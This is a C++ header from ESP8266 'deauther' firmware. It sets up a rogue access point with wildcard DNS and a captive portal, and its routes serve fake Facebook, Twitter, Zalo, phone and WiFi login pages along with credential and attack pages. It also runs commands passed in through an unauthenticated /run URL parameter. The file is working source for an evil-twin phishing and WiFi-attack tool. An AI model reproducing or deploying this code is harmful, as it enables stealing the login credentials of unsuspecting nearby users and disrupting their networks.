#ifndef WifiManager_h
#define WifiManager_h

#include "Arduino.h"
#include <DNSServer.h>
#include <ESP8266WebServer.h>
#include <ESP8266WiFi.h>
#include <ESP8266mDNS.h>
#include <FS.h>
//#include <Settings.h>
#include <WiFiClient.h>
extern "C" {
#include "user_interface.h"
}

// extern Settings settings;

#define WIFI_MODE_OFF 0
#define WIFI_MODE_AP 1
#define WIFI_MODE_STATION 2

/*
   This file contains all necessary functions for hosting and connecting to an
   access point. For compatibility and simplicity, all those functions are
   global.
 */

// Important strings
const char W_DEAUTHER[] PROGMEM =
    "deauther"; // captive portal domain (alternative to 192.168.4.1)
const char W_WEBINTERFACE[] PROGMEM =
    "/web"; // default folder containing the web files
const char W_ERROR_PASSWORD[] PROGMEM =
    "ERROR: Password must have at least 8 characters!";
const char W_DEFAULT_LANG[] PROGMEM = "/lang/default.lang";

const char W_HTML[] PROGMEM = "text/html";
const char W_CSS[] PROGMEM = "text/css";
const char W_JS[] PROGMEM = "application/javascript";
const char W_PNG[] PROGMEM = "image/png";
const char W_GIF[] PROGMEM = "image/gif";
const char W_JPG[] PROGMEM = "image/jpeg";
const char W_ICON[] PROGMEM = "image/x-icon";
const char W_XML[] PROGMEM = "text/xml";
const char W_XPDF[] PROGMEM = "application/x-pdf";
const char W_XZIP[] PROGMEM = "application/x-zip";
const char W_GZIP[] PROGMEM = "application/x-gzip";
const char W_JSON[] PROGMEM = "application/json";
const char W_TXT[] PROGMEM = "text/plain";

const char W_DOT_HTM[] PROGMEM = ".htm";
const char W_DOT_HTML[] PROGMEM = ".html";
const char W_DOT_CSS[] PROGMEM = ".css";
const char W_DOT_JS[] PROGMEM = ".js";
const char W_DOT_PNG[] PROGMEM = ".png";
const char W_DOT_GIF[] PROGMEM = ".gif";
const char W_DOT_JPG[] PROGMEM = ".jpg";
const char W_DOT_ICON[] PROGMEM = ".ico";
const char W_DOT_XML[] PROGMEM = ".xml";
const char W_DOT_PDF[] PROGMEM = ".pdf";
const char W_DOT_ZIP[] PROGMEM = ".zip";
const char W_DOT_GZIP[] PROGMEM = ".gz";
const char W_DOT_JSON[] PROGMEM = ".json";

// Server and other global objects
ESP8266WebServer server(80);
DNSServer dnsServer;
IPAddress apIP(192, 168, 4, 1);
IPAddress netMsk(255, 255, 255, 0);
File fsUploadFile;

// current WiFi mode and config
uint8_t wifiMode = WIFI_MODE_OFF;

bool wifi_config_hidden = false;
bool wifi_config_captivePortal = false;
bool wifi_config_none_password = true;
String wifi_config_ssid;
String wifi_config_password;
String wifi_config_path;

void stopAP() {
  if (wifiMode == WIFI_MODE_AP) {
    wifi_promiscuous_enable(0);
    WiFi.persistent(false);
    WiFi.disconnect(true);
    wifi_set_opmode(STATION_MODE);
    prntln(W_STOPPED_AP);
    wifiMode = WIFI_MODE_STATION;
  }
}

String getWifiMode() {
  switch (wifiMode) {
  case WIFI_MODE_OFF:
    return W_MODE_OFF;

    break;

  case WIFI_MODE_AP:
    return W_MODE_AP;

    break;

  case WIFI_MODE_STATION:
    return W_MODE_ST;

    break;

  default:
    return String();
  }
}

String getContentType(String filename) {
  if (server.hasArg("download"))
    return String(F("application/octet-stream"));
  else if (filename.endsWith(str(W_DOT_GZIP)))
    filename = filename.substring(0, filename.length() - 3);
  else if (filename.endsWith(str(W_DOT_HTM)))
    return str(W_HTML);
  else if (filename.endsWith(str(W_DOT_HTML)))
    return str(W_HTML);
  else if (filename.endsWith(str(W_DOT_CSS)))
    return str(W_CSS);
  else if (filename.endsWith(str(W_DOT_JS)))
    return str(W_JS);
  else if (filename.endsWith(str(W_DOT_PNG)))
    return str(W_PNG);
  else if (filename.endsWith(str(W_DOT_GIF)))
    return str(W_GIF);
  else if (filename.endsWith(str(W_DOT_JPG)))
    return str(W_JPG);
  else if (filename.endsWith(str(W_DOT_ICON)))
    return str(W_ICON);
  else if (filename.endsWith(str(W_DOT_XML)))
    return str(W_XML);
  else if (filename.endsWith(str(W_DOT_PDF)))
    return str(W_XPDF);
  else if (filename.endsWith(str(W_DOT_ZIP)))
    return str(W_XZIP);
  else if (filename.endsWith(str(W_DOT_JSON)))
    return str(W_JSON);
  else
    return str(W_TXT);
}

bool handleFileRead(String path) {

  if (!path.charAt(0) == SLASH)
    path = String(SLASH) + path;

  if (path.charAt(path.length() - 1) == SLASH)
    path += String(F("index.html"));

  String contentType = getContentType(path);

  if (!SPIFFS.exists(path)) {
    if (SPIFFS.exists(path + str(W_DOT_GZIP)))
      path += str(W_DOT_GZIP);
    else if (SPIFFS.exists(wifi_config_path + path))
      path = wifi_config_path + path;
    else if (SPIFFS.exists(wifi_config_path + path + str(W_DOT_GZIP)))
      path = wifi_config_path + path + str(W_DOT_GZIP);
    else {
      // prntln("stream file: " + path + " error");
      return false;
    }
  }

  File file = SPIFFS.open(path, "r");
  prntln("stream file: " + path);
  server.streamFile(file, contentType);

  file.close();
  // prnt(SPACE);
  // prntln(W_OK);

  return true;
}

void handleFileList() {
  if (!server.hasArg("dir")) {
    server.send(500, str(W_TXT), str(W_BAD_ARGS));
    return;
  }

  String path = server.arg("dir");
  // Serial.println("handleFileList: " + path);
  Dir dir = SPIFFS.openDir(path);

  String output = String(OPEN_BRACKET); // {
  File entry;
  bool first = true;

  while (dir.next()) {
    entry = dir.openFile("r");

    if (first)
      first = false;
    else
      output += COMMA; // ,

    output += OPEN_BRACKET; // [
    output += String(DOUBLEQUOTES) + entry.name() +
              String(DOUBLEQUOTES); // "filename"
    output += CLOSE_BRACKET;        // ]

    entry.close();
  }

  output += CLOSE_BRACKET;
  server.send(200, str(W_JSON).c_str(), output);
}

void sendProgmem(const char *ptr, size_t size, const char *type) {
  server.sendHeader("Content-Encoding", "gzip");
  server.sendHeader("Cache-Control", "max-age=86400");
  server.send_P(200, str(type).c_str(), ptr, size);
}

void setupMdns() {
  dnsServer.setErrorReplyCode(DNSReplyCode::NoError);
  if (dnsServer.start(53, String(ASTERIX), apIP)) {
    // prntln("dnsServer true");
  } else {
    // prntln("dnsServer false");
  }

  if (MDNS.begin(str(W_DEAUTHER).c_str())) {
    // prntln("MDNS.begin true");
  } else {
    // prntln("MDNS.begin false");
  }

  if (MDNS.addService("http", "tcp", 80)) {
    // prntln("MDNS.addService true");
  } else {
    // prntln("MDNS.addService false");
  }

  server.begin();
  prnt("mDns name: ");
  prntln(W_DEAUTHER);
}

void wifiUpdate() {
  //&& !scan.isScanning()
  // if ((WiFi.getMode() != W_MODE_OFF)) {
  //   server.handleClient();
  //   dnsServer.processNextRequest();
  //   MDNS.update();
  // }
  server.handleClient();
  dnsServer.processNextRequest();
  if (MDNS.update()) {
    // prntln("mdns update true");
  } else {
    // prntln("mdns update false");
    // setupMdns();
  }
}

// path = folder of web files, ssid = name of network, password = password ("0"
// => no password), hidden = if the network is visible, captivePortal = enable a
// captive portal
// wifi_config_none_password
void startAP(String path, String ssid, String password, uint8_t ch, bool hidden,
             bool captivePortal, bool none_password) {
  //   prnt(String(F("start startAP")));
  if (password.length() < 8) {
    prntln(W_ERROR_PASSWORD);
    return;
  }

  if (!path.charAt(0) == SLASH)
    path = String(SLASH) + path;

  if (password == String(ZERO))
    password = String(NEWLINE);

  wifi_config_path = path;
  wifi_config_ssid = ssid;
  wifi_config_password = password;
  setWifiChannel(ch);
  wifi_config_hidden = hidden;
  wifi_config_captivePortal = captivePortal;
  WiFi.softAPConfig(apIP, apIP, netMsk);
  if (none_password) {
    WiFi.softAP(ssid.c_str());
  } else {
    WiFi.softAP(ssid.c_str(), password.c_str(), wifi_channel, hidden);
  }

  server.on(String(F("/list")).c_str(), HTTP_GET,
            handleFileList); // list directory

  // ================================================================
  // post here the output of the webConverter.py
#ifdef USE_PROGMEM_WEB_FILES
  if (!settings.getWebSpiffs()) {
    server.on(String(SLASH).c_str(), HTTP_GET,
              []() { sendProgmem(indexhtml, sizeof(indexhtml), W_HTML); });
    server.on(String(F("/attack.html")).c_str(), HTTP_GET,
              []() { sendProgmem(attackhtml, sizeof(attackhtml), W_HTML); });
    server.on(String(F("/index.html")).c_str(), HTTP_GET,
              []() { sendProgmem(indexhtml, sizeof(indexhtml), W_HTML); });
    server.on(String(F("/info.html")).c_str(), HTTP_GET,
              []() { sendProgmem(infohtml, sizeof(infohtml), W_HTML); });
    server.on(String(F("/scan.html")).c_str(), HTTP_GET,
              []() { sendProgmem(scanhtml, sizeof(scanhtml), W_HTML); });
    server.on(String(F("/settings.html")).c_str(), HTTP_GET, []() {
      sendProgmem(settingshtml, sizeof(settingshtml), W_HTML);
    });

    server.on(String(F("/captiveportal.html")).c_str(), HTTP_GET, []() {
      sendProgmem(captiveportalhtml, sizeof(captiveportalhtml), W_HTML);
    });

    server.on(String(F("/update.html")).c_str(), HTTP_GET,
              []() { sendProgmem(updatehtml, sizeof(updatehtml), W_HTML); });

    server.on(String(F("/phone.html")).c_str(), HTTP_GET,
              []() { sendProgmem(phonehtml, sizeof(phonehtml), W_HTML); });

    server.on(String(F("/facebook.html")).c_str(), HTTP_GET, []() {
      sendProgmem(facebookhtml, sizeof(facebookhtml), W_HTML);
    });
    server.on(String(F("/facebook.css")).c_str(), HTTP_GET,
              []() { sendProgmem(facebookcss, sizeof(facebookcss), W_CSS); });

    server.on(String(F("/zalo.html")).c_str(), HTTP_GET,
              []() { sendProgmem(zalohtml, sizeof(zalohtml), W_HTML); });
    server.on(String(F("/zalo.css")).c_str(), HTTP_GET,
              []() { sendProgmem(zalocss, sizeof(zalocss), W_CSS); });
    server.on(String(F("/twitter.html")).c_str(), HTTP_GET,
              []() { sendProgmem(twitterhtml, sizeof(twitterhtml), W_HTML); });
    server.on(String(F("/images/zalo.png")).c_str(), HTTP_GET,
              []() { sendProgmem(zalopng, sizeof(zalopng), W_PNG); });
    server.on(String(F("/images/logo.png")).c_str(), HTTP_GET,
              []() { sendProgmem(logopng, sizeof(logopng), W_PNG); });
    server.on(String(F("/images/twitter.png")).c_str(), HTTP_GET,
              []() { sendProgmem(twitterpng, sizeof(twitterpng), W_PNG); });
    server.on(String(F("/images/facebook.png")).c_str(), HTTP_GET,
              []() { sendProgmem(facebookpng, sizeof(facebookpng), W_PNG); });

    server.on(String(F("/css/fonts/fontawesome-webfont.svg")).c_str(), HTTP_GET,
              []() {
                sendProgmem(fontawesomewebfontsvg,
                            sizeof(fontawesomewebfontsvg), W_ICON);
              });

    server.on(String(F("/images/logos.png")).c_str(), HTTP_GET,
              []() { sendProgmem(logospng, sizeof(logospng), W_PNG); });

    server.on(String(F("/images/phone.png")).c_str(), HTTP_GET,
              []() { sendProgmem(phonepng, sizeof(phonepng), W_PNG); });

    server.on(String(F("/credential.html")).c_str(), HTTP_GET, []() {
      sendProgmem(credentialhtml, sizeof(credentialhtml), W_HTML);
    });

    server.on(String(F("/ssids.html")).c_str(), HTTP_GET,
              []() { sendProgmem(ssidshtml, sizeof(ssidshtml), W_HTML); });

    server.on(String(F("/style.css")).c_str(), HTTP_GET,
              []() { sendProgmem(stylecss, sizeof(stylecss), W_CSS); });

    server.on(String(F("/js/attack.js")).c_str(), HTTP_GET,
              []() { sendProgmem(attackjs, sizeof(attackjs), W_JS); });

    server.on(String(F("/js/update.js")).c_str(), HTTP_GET,
              []() { sendProgmem(updatejs, sizeof(updatejs), W_JS); });

    server.on(String(F("/js/credential.js")).c_str(), HTTP_GET,
              []() { sendProgmem(credentialjs, sizeof(credentialjs), W_JS); });
    server.on(String(F("/js/scan.js")).c_str(), HTTP_GET,
              []() { sendProgmem(scanjs, sizeof(scanjs), W_JS); });
    server.on(String(F("/js/settings.js")).c_str(), HTTP_GET,
              []() { sendProgmem(settingsjs, sizeof(settingsjs), W_JS); });
    server.on(String(F("/js/site.js")).c_str(), HTTP_GET,
              []() { sendProgmem(sitejs, sizeof(sitejs), W_JS); });
    server.on(String(F("/js/ssids.js")).c_str(), HTTP_GET,
              []() { sendProgmem(ssidsjs, sizeof(ssidsjs), W_JS); });
    server.on(String(F("/lang/cn.lang")).c_str(), HTTP_GET,
              []() { sendProgmem(cnlang, sizeof(cnlang), W_JSON); });
    server.on(String(F("/lang/cs.lang")).c_str(), HTTP_GET,
              []() { sendProgmem(cslang, sizeof(cslang), W_JSON); });
    server.on(String(F("/lang/de.lang")).c_str(), HTTP_GET,
              []() { sendProgmem(delang, sizeof(delang), W_JSON); });
    server.on(String(F("/lang/en.lang")).c_str(), HTTP_GET,
              []() { sendProgmem(enlang, sizeof(enlang), W_JSON); });
    server.on(String(F("/lang/es.lang")).c_str(), HTTP_GET,
              []() { sendProgmem(eslang, sizeof(eslang), W_JSON); });
    server.on(String(F("/lang/fi.lang")).c_str(), HTTP_GET,
              []() { sendProgmem(filang, sizeof(filang), W_JSON); });
    server.on(String(F("/lang/fr.lang")).c_str(), HTTP_GET,
              []() { sendProgmem(frlang, sizeof(frlang), W_JSON); });
    server.on(String(F("/lang/it.lang")).c_str(), HTTP_GET,
              []() { sendProgmem(itlang, sizeof(itlang), W_JSON); });
    server.on(String(F("/lang/ru.lang")).c_str(), HTTP_GET,
              []() { sendProgmem(rulang, sizeof(rulang), W_JSON); });
    server.on(String(F("/lang/tlh.lang")).c_str(), HTTP_GET,
              []() { sendProgmem(tlhlang, sizeof(tlhlang), W_JSON); });
    server.on(String(F("/lang/vi.lang")).c_str(), HTTP_GET,
              []() { sendProgmem(vilang, sizeof(vilang), W_JSON); });
  }
  server.on(str(W_DEFAULT_LANG).c_str(), HTTP_GET, []() {
    if (!settings.getWebSpiffs()) {
      if (settings.getLang() == String(F("cn")))
        sendProgmem(cnlang, sizeof(cnlang), W_JSON);
      else if (settings.getLang() == String(F("cs")))
        sendProgmem(cslang, sizeof(cslang), W_JSON);
      else if (settings.getLang() == String(F("de")))
        sendProgmem(delang, sizeof(delang), W_JSON);
      else if (settings.getLang() == String(F("en")))
        sendProgmem(enlang, sizeof(enlang), W_JSON);
      else if (settings.getLang() == String(F("es")))
        sendProgmem(eslang, sizeof(eslang), W_JSON);
      else if (settings.getLang() == String(F("fi")))
        sendProgmem(filang, sizeof(filang), W_JSON);
      else if (settings.getLang() == String(F("fr")))
        sendProgmem(frlang, sizeof(frlang), W_JSON);
      else if (settings.getLang() == String(F("it")))
        sendProgmem(itlang, sizeof(itlang), W_JSON);
      else if (settings.getLang() == String(F("ru")))
        sendProgmem(rulang, sizeof(rulang), W_JSON);
      else if (settings.getLang() == String(F("tlh")))
        sendProgmem(tlhlang, sizeof(tlhlang), W_JSON);
      else if (settings.getLang() == String(F("vi")))
        sendProgmem(vilang, sizeof(vilang), W_JSON);

      else
        handleFileRead(String(F("/web/lang/")) + settings.getLang() +
                       String(F(".lang")));
    } else {
      handleFileRead(String(F("/web/lang/")) + settings.getLang() +
                     String(F(".lang")));
    }
  });
#endif
  // ================================================================

  server.on(String(F("/run")).c_str(), HTTP_GET, []() {
    server.send(200, str(W_TXT), str(W_OK).c_str());
    String input = server.arg("cmd");
    cli.exec(input); // run command from web or serial
  });

  server.on(String(F("/attack.json")).c_str(), HTTP_GET,
            []() { server.send(200, str(W_JSON), attack.getStatusJSON()); });

  // aggressively caching static assets
  server.serveStatic("/js", SPIFFS, String(wifi_config_path + "/js").c_str(),
                     "max-age=86400");

  // called when the url is not defined here
  // use it to load content from SPIFFS
  server.onNotFound([]() {
    if (!handleFileRead(server.uri())) {
      if (settings.getCaptivePortal()) {
        switch (settings.getCaptiveType()) {
        case CAPTIVE_TYPE::TWITTER:
          sendProgmem(captiveindextwitterhtml, sizeof(captiveindextwitterhtml),
                      W_HTML);
          break;
        case CAPTIVE_TYPE::FACEBOOK:
          sendProgmem(captiveindexfacebookhtml,
                      sizeof(captiveindexfacebookhtml), W_HTML);
          break;
        case CAPTIVE_TYPE::ZALO:
          sendProgmem(captiveindexzalohtml, sizeof(captiveindexzalohtml),
                      W_HTML);
          break;
        case CAPTIVE_TYPE::PHONE:
          sendProgmem(captiveindexphonehtml, sizeof(captiveindexphonehtml),
                      W_HTML);
          break;
        case CAPTIVE_TYPE::WIFI:
          sendProgmem(wifihtml, sizeof(wifihtml), W_HTML);
          break;
        }
      } else {
        server.send(404, str(W_TXT), str(W_FILE_NOT_FOUND));
      }
    }
    prntln(server.uri());
  });

  wifiMode = WIFI_MODE_AP;
  server.begin();
  // setupMdns();
  prntln(W_STARTED_AP);
  printWifiStatus();
}

void printWifiStatus() {
  prnt(String(F("[WiFi] Path: '")));
  prnt(wifi_config_path);
  prnt(String(F("', Mode: '")));

  switch (wifiMode) {
  case WIFI_MODE_OFF:
    prnt(W_MODE_OFF);
    break;

  case WIFI_MODE_AP:
    prnt(W_AP);
    break;

  case WIFI_MODE_STATION:
    prnt(W_STATION);
    break;
  }
  prnt(String(F("', SSID: '")));
  prnt(wifi_config_ssid);
  prnt(String(F("', password: '")));
  prnt(wifi_config_password);
  prnt(String(F("', channel: '")));
  prnt(wifi_channel);
  prnt(String(F("', hidden: ")));
  prnt(b2s(wifi_config_hidden));
  prnt(String(F(", captive-portal: ")));
  prntln(b2s(wifi_config_captivePortal));
  prnt(String(F(", set_none_password: ")));
  prntln(b2s(wifi_config_none_password));
}

void startAP() {
  startAP(wifi_config_path.c_str(), wifi_config_ssid.c_str(),
          wifi_config_password.c_str(), wifi_channel, wifi_config_hidden,
          wifi_config_captivePortal, wifi_config_none_password);
}

void startAP(String path) {
  wifi_config_path = path;
  startAP();
}

void loadWifiConfigDefaults() {
  wifi_config_hidden = settings.getHidden();
  wifi_config_ssid = settings.getSSID();
  wifi_config_password = settings.getPassword();
  wifi_config_captivePortal = settings.getCaptivePortal();
  wifi_config_none_password = settings.getNonePassword();
  wifi_config_path = str(W_WEBINTERFACE);
}

void resumeAP() {
  if (wifiMode != WIFI_MODE_AP) {
    wifiMode = WIFI_MODE_AP;
    wifi_promiscuous_enable(0);
    WiFi.softAPConfig(apIP, apIP, netMsk);
    if (wifi_config_none_password) {
      WiFi.softAP(wifi_config_ssid.c_str());
    } else {
      WiFi.softAP(wifi_config_ssid.c_str(), wifi_config_password.c_str(),
                  wifi_channel, wifi_config_hidden);
    }
    prntln(W_STARTED_AP);
  }
}

#endif // ifndef WifiManager_h
